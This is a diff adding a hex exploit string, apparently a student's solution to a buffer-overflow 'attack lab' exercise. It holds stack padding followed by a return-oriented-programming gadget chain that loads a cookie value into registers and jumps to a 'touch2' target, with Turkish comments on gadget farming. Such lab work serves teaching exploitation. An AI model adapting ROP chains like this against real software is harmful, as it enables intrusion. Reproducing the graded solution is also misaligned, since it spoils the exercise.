@@ -1,0 +1,17 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00   /* padding buraya kadar */
+18 1e 40 00 00 00 00 00   /* pop rax start farming'den end farming'e kadar bir pop rax, rbx, rcx .. byte'ı bul. pop rbx */
+fc 07 4a 44 00 00 00 00   /* adr of cookie*/
+4e 1e 40 00 00 00 00 00   /* pop rax start farming'den end farming'e kadar bir pop rax, rbx, rcx .. byte'ı bul. pop rdx */
+f4 17 de cc 00 00 00 00   /* adr cookie*3 */
+26 1e 40 00 00 00 00 00   /* movq rax,rdi byteları farmla. movq rbx, rdi */
+61 1e 40 00 00 00 00 00   /* rbx'i rsi a atan kod çıkmadı. rcx ile dene. movq rdx, rcx
+3e 1e 40 00 00 00 00 00   /* movq rcx, rsi */
+15 1b 40 00 00 00 00 00   /* touch 2 */
